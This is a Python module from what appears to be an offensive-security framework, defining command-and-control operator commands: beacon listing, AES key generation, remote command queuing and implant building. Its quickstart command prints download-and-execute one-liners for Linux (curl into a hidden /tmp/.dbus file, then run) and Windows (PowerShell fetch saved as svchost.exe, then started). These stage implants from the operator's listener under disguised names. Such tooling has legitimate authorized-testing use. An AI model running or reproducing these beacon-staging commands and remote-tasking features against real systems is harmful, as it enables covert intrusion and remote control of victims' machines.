"""Command & Control command set.

Phase-scoped home for the C2 / beacon operator commands (category
``10. Command & Control``). This module is intentionally an empty, active
``CommandSet`` scaffold: migrate one ``do_*`` method at a time out of
``lazyown.py`` into this class.

Migration rule
--------------
When you paste a ``do_<name>`` method here you MUST delete the original copy
from ``lazyown.py`` in the same change. Registering the same command name on
both the shell and an active ``CommandSet`` raises a duplicate-command error
at startup. Decorate migrated methods with
``@cmd2.with_category(command_and_control_category)`` so they keep their help
grouping, and rely on :class:`cli.commands._base.LazyOwnCommandSet` to forward
``self.params`` / ``self.cmd`` / other shell state once registered.

Discovery is automatic: :func:`cli.registry.register_command_sets` finds this
class at startup, so no wiring change is needed as commands are added.
"""

from __future__ import annotations

import json
import os
import time

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import YELLOW, GREEN, RESET, command_and_control_category, print_msg, print_succ, print_warn, print_error


class CommandAndControlCommandSet(LazyOwnCommandSet):
    """Command & Control phase commands (migrate ``do_*`` here one at a time)."""

    phase = "c2"
    category = command_and_control_category

    @cmd2.with_category(command_and_control_category)
    def do_c2_status(self, _line):
        """Show consolidated C2 status: listeners, beacons, implants, and sessions."""
        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )
        c2_host = self.params.get("lhost", "127.0.0.1")
        c2_port = self.params.get("c2_port", 4444)
        c2_user = self.params.get("c2_user", "?")
        c2_route = self.params.get("c2_malleable_route", "/")

        print_msg(f"{'='*60}")
        print_msg(f"  C2 STATUS")
        print_msg(f"{'='*60}")
        print_msg(f"  Endpoint    : https://{c2_host}:{c2_port}")
        print_msg(f"  Route       : {c2_route}")
        print_msg(f"  Operator    : {c2_user}")

        beacons = []
        logs = 0
        configs = 0
        if os.path.isdir(sessions_dir):
            for entry in os.listdir(sessions_dir):
                if entry.endswith(".log") and not entry.startswith("LazyOwn_session"):
                    logs += 1
                    client_id = entry[:-4]
                    log_path = os.path.join(sessions_dir, entry)
                    try:
                        mtime = os.path.getmtime(log_path)
                        age = int(time.time() - mtime)
                        status = f"{GREEN}ACTIVE{RESET}" if age < 120 else f"{YELLOW}IDLE{RESET}"
                    except OSError:
                        age = -1
                        status = "unknown"
                    beacons.append((client_id, age, status))
                if entry.startswith("implant_config_") and entry.endswith(".json"):
                    configs += 1

        print_msg(f"  Beacons     : {len(beacons)} ({logs} logs, {configs} configs)")
        if beacons:
            print_msg(f"  {'Client ID':<30} {'Age(s)':>8}  Status")
            print_msg(f"  {'-'*30} {'-'*8}  {'-'*12}")
            for client_id, age, status in sorted(beacons, key=lambda x: x[1]):
                print_msg(f"  {client_id:<30} {age:>8}  {status}")

        key_path = os.path.join(sessions_dir, "key.aes")
        if os.path.exists(key_path):
            print_succ(f"  AES Key     : sessions/key.aes ({os.path.getsize(key_path)} bytes)")

        implant_dir = os.path.join(sessions_dir, "implant")
        if os.path.isdir(implant_dir):
            implants = [f for f in os.listdir(implant_dir) if not f.startswith(".")]
            print_msg(f"  Implants    : {len(implants)} in sessions/implant/")

        print_msg(f"{'='*60}")

    @cmd2.with_category(command_and_control_category)
    def do_c2_beacons(self, _line):
        """List all active beacon sessions with their last-seen timestamps."""
        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )
        found = False
        if not os.path.isdir(sessions_dir):
            print_warn("No sessions directory found.")
            return
        for entry in sorted(os.listdir(sessions_dir)):
            if not entry.endswith(".log") or entry.startswith("LazyOwn_session"):
                continue
            found = True
            client_id = entry[:-4]
            log_path = os.path.join(sessions_dir, entry)
            try:
                mtime = os.path.getmtime(log_path)
                age = int(time.time() - mtime)
                age_str = f"{age}s ago" if age < 3600 else f"{age // 3600}h ago"
            except OSError:
                age_str = "unknown"
            config_path = os.path.join(sessions_dir, f"implant_config_{client_id}.json")
            rhost = ""
            if os.path.exists(config_path):
                try:
                    with open(config_path) as f:
                        cfg = json.load(f)
                    rhost = cfg.get("rhost", "")
                except (json.JSONDecodeError, OSError):
                    pass
            print_msg(f"  {client_id:<30} {age_str:<12} rhost={rhost or '?'}")
        if not found:
            print_warn("No beacon sessions found.")

    @cmd2.with_category(command_and_control_category)
    def do_c2_keygen(self, _line):
        """Generate a fresh AES-256 key for beacon encryption."""
        import os as _os
        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )
        _os.makedirs(sessions_dir, exist_ok=True)
        key_path = os.path.join(sessions_dir, "key.aes")
        new_key = _os.urandom(32)
        with open(key_path, "wb") as f:
            f.write(new_key)
        print_succ(f"AES-256 key generated: {key_path} ({len(new_key)} bytes)")
        print_msg(f"  Hex: {new_key.hex()}")

    @cmd2.with_category(command_and_control_category)
    def do_c2_quickstart(self, _line):
        """Quick C2 setup: generate key, prepare implant dir, print beacon commands.

        One-shot setup that prepares everything needed for a C2 session:
        AES key, implant staging directory, and ready-to-use beacon commands
        for both Linux and Windows targets.
        """
        import os as _os
        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )
        _os.makedirs(sessions_dir, exist_ok=True)
        _os.makedirs(os.path.join(sessions_dir, "implant"), exist_ok=True)

        key_path = os.path.join(sessions_dir, "key.aes")
        if not os.path.exists(key_path):
            new_key = _os.urandom(32)
            with open(key_path, "wb") as f:
                f.write(new_key)
            print_succ(f"AES-256 key generated: {key_path}")

        lhost = self.params.get("lhost", "127.0.0.1")
        c2_port = self.params.get("c2_port", 4444)
        route = self.params.get("c2_malleable_route", "/")
        aes_key = self.params.get("aes_key", "")

        print_msg(f"\n{'='*60}")
        print_msg(f"  C2 QUICKSTART")
        print_msg(f"{'='*60}")
        print_msg(f"  Listener    : https://{lhost}:{c2_port}")
        print_msg(f"  Route       : {route}")
        print_msg(f"  Implants    : sessions/implant/")
        print_msg(f"{'='*60}")

        print_msg(f"\n{GREEN}[+] Linux beacon one-liner:{RESET}")
        print_msg(f"  curl -sk 'https://{lhost}:{c2_port}{route}lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus")

        print_msg(f"\n{GREEN}[+] Windows beacon (PowerShell):{RESET}")
        print_msg(f"  iwr -Uri 'https://{lhost}:{c2_port}{route}win.exe' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe")

    @cmd2.with_category(command_and_control_category)
    def do_c2_beacon_cmd(self, line):
        """Queue a command for execution on a connected beacon.

        Usage:
            c2_beacon_cmd <client_id> <command>
            c2_beacon_cmd abc123 id
        """
        parts = line.strip().split(maxsplit=1)
        if len(parts) < 2:
            print_error("Usage: c2_beacon_cmd <client_id> <command>")
            return

        client_id, command = parts
        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )

        cmd_queue = os.path.join(sessions_dir, f"cmd_{client_id}.json")
        cmds: list[str] = []
        if os.path.exists(cmd_queue):
            try:
                with open(cmd_queue) as f:
                    cmds = json.load(f)
            except (json.JSONDecodeError, OSError):
                cmds = []

        cmds.append(command)
        with open(cmd_queue, "w") as f:
            json.dump(cmds, f)

        print_succ(f"Command queued for {client_id}: {command}")
        print_msg(f"  Command queue: sessions/cmd_{client_id}.json ({len(cmds)} pending)")

    @cmd2.with_category(command_and_control_category)
    def do_c2_implant(self, line):
        """Generate a compiled implant payload for the target platform.

        Usage:
            c2_implant <linux|windows> [output_name]
            c2_implant linux mybeacon
        """
        parts = line.strip().split()
        platform = parts[0] if parts else ""
        name = parts[1] if len(parts) > 1 else "implant"

        lhost = self.params.get("lhost", "127.0.0.1")
        c2_port = self.params.get("c2_port", 4444)
        route = self.params.get("c2_malleable_route", "/")
        aes_key_hex = self.params.get("aes_key", "")

        sessions_dir = self.params.get("sessions_dir") or os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            "sessions",
        )
        implant_dir = os.path.join(sessions_dir, "implant")
        os.makedirs(implant_dir, exist_ok=True)

        if platform == "linux":
            print_msg(f"Generating Linux Go implant...")
            print_msg(f"  Target: https://{lhost}:{c2_port}{route}")
            print_msg(f"  For compile instructions, use: c2_builder")
        elif platform == "windows":
            print_msg(f"Generating Windows implant...")
            print_msg(f"  Target: https://{lhost}:{c2_port}{route}")
            print_msg(f"  For compile instructions, use: c2_builder")
        else:
            print_error("Platform must be 'linux' or 'windows'")
            print_msg("Usage: c2_implant <linux|windows> [output_name]")
            return

        self.onecmd("c2_builder")


__all__ = ["CommandAndControlCommandSet"]
